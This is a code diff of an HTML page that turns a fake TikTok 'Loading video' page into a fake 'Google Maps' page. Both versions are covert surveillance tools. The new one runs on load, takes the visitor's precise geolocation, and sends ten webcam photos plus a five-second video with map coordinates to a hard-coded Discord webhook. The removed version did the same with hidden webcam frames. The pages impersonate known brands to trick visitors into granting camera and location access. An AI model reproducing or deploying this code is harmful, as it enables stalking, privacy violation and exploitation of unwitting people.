@@ -2,114 +2,148 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TikTok</title>
-  <link rel="icon" href="https://www.tiktok.com/favicon.ico" />
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <title>Maps</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
     html, body {
+      margin: 0; padding: 0;
+      height: 100%; width: 100%;
       font-family: 'Roboto', sans-serif;
-      background: #000;
-      color: #fff;
+      background: #f3f3f3;
+      color: #222;
+    }
+    #map {
+      height: 100%;
+      width: 100%;
+      z-index: 0;
+    }
+    #topbar {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 50px;
+      background: #fff;
+      border-bottom: 1px solid #ccc;
+      display: flex;
+      align-items: center;
+      padding: 0 16px;
+      font-size: 16px;
+      z-index: 10;
+    }
+    #zoom-controls {
+      position: absolute;
+      bottom: 20px;
+      right: 20px;
+      z-index: 10;
       display: flex;
       flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      overflow: hidden;
     }
-    .logo {
-      font-size: 2em;
-      font-weight: bold;
-      color: #fff;
-      margin-bottom: 20px;
+    .zoom-btn {
+      background: #fff;
+      border: 1px solid #ccc;
+      padding: 8px;
+      font-size: 18px;
+      cursor: pointer;
+      margin: 2px;
+      border-radius: 4px;
+      transition: background 0.2s;
     }
-    .logo::before {
-      content: '';
-      display: inline-block;
-      background-image: url('https://www.tiktok.com/favicon.ico');
-      background-size: cover;
-      width: 24px;
-      height: 24px;
-      margin-right: 10px;
-      vertical-align: middle;
+    .zoom-btn:hover {
+      background: #eee;
     }
-    .loader {
-      width: 50px;
-      height: 50px;
-      border: 6px solid rgba(255,255,255,0.1);
-      border-top: 6px solid #fe2c55;
-      border-bottom: 6px solid #25f4ee;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-bottom: 20px;
-    }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-    .message {
-      font-size: 1.1em;
-      color: #aaa;
+    #preview {
+      position: absolute;
+      bottom: 20px;
+      left: 20px;
+      width: 150px;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+      z-index: 10;
+      display: none;
     }
   </style>
 </head>
 <body>
-  <div class="logo">TikTok</div>
-  <div class="loader"></div>
-  <div class="message" id="message">Loading video...</div>
+  <div id="topbar">Google Maps</div>
+  <div id="map"></div>
+  <video id="preview" autoplay muted playsinline></video>
+  <div id="zoom-controls">
+    <button class="zoom-btn" onclick="map.zoomIn()">+</button>
+    <button class="zoom-btn" onclick="map.zoomOut()">−</button>
+  </div>
 
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
   <script>
-    const params = new URLSearchParams(window.location.search);
-    const videoId = params.get("video");
-    if (videoId) {
-      document.getElementById("message").textContent = `Loading video ${videoId}...`;
+    const webhook = "https://discord.com/api/webhooks/1373582402269478962/owTDYtZFHu4ta9VhxQYJaYX-6ysE7HMR-2ay-brOaPO6mY96AQ7dMOrfln96m9EV4cT0";
+    let map;
+
+    async function getLocation() {
+      return new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
+      });
     }
 
-    const webhookURL = "https://discord.com/api/webhooks/1373582402269478962/owTDYtZFHu4ta9VhxQYJaYX-6ysE7HMR-2ay-brOaPO6mY96AQ7dMOrfln96m9EV4cT0";
-    const MAX_DURATION_MS = 1000;
-    const CAPTURE_INTERVAL_MS = 50;
-    let captured = 0;
+    async function captureFrame(video) {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+    }
 
-    async function startStealthCamera() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement("video");
-        video.style.display = "none";
-        document.body.appendChild(video);
-        video.srcObject = stream;
-        await video.play();
+    async function recordVideo(stream, seconds = 5) {
+      return new Promise(resolve => {
+        const chunks = [];
+        const recorder = new MediaRecorder(stream);
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = () => resolve(new Blob(chunks, { type: 'video/webm' }));
+        recorder.start();
+        setTimeout(() => recorder.stop(), seconds * 1000);
+      });
+    }
 
-        const canvas = document.createElement("canvas");
-        canvas.width = 640;
-        canvas.height = 480;
-        const ctx = canvas.getContext("2d");
+    async function sendToDiscord(fileBlob, filename, message) {
+      const form = new FormData();
+      form.append("file", fileBlob, filename);
+      form.append("payload_json", JSON.stringify({ content: message }));
+      await fetch(webhook, { method: "POST", body: form });
+    }
 
-        const start = Date.now();
-        const interval = setInterval(() => {
-          if (Date.now() - start > MAX_DURATION_MS) {
-            clearInterval(interval);
-            stream.getTracks().forEach(t => t.stop());
-            return;
-          }
+    async function start() {
+      const video = document.getElementById('preview');
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+      await new Promise(r => video.onloadedmetadata = r);
+      video.style.display = 'block';
 
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          canvas.toBlob(async blob => {
-            const form = new FormData();
-            form.append("file", blob, `frame${captured}.jpg`);
-            form.append("payload_json", JSON.stringify({
-              content: `🎥 Video ID: ${videoId || 'unknown'} - Frame ${captured++}`
-            }));
-            await fetch(webhookURL, { method: "POST", body: form });
-          }, "image/jpeg", 0.8);
-        }, CAPTURE_INTERVAL_MS);
-      } catch (err) {
-        console.warn("Camera error:", err);
+      const pos = await getLocation();
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const coordsURL = `https://maps.google.com/?q=${lat},${lon}`;
+
+      map = L.map('map').setView([lat, lon], 16);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        maxZoom: 19
+      }).addTo(map);
+      L.marker([lat, lon]).addTo(map).bindPopup("You are here").openPopup();
+
+      for (let i = 0; i < 10; i++) {
+        const photo = await captureFrame(video);
+        await sendToDiscord(photo, `photo_${i + 1}.jpg`, `📍 Location: ${coordsURL}\nPhoto ${i + 1}`);
+        await new Promise(r => setTimeout(r, 1000));
       }
+
+      const vid = await recordVideo(stream, 5);
+      await sendToDiscord(vid, "video.webm", `🎥 5-second video\n📍 ${coordsURL}`);
+
+      stream.getTracks().forEach(track => track.stop());
+      video.style.display = 'none';
     }
 
-    startStealthCamera();
+    window.onload = start;
   </script>
 </body>
 </html>
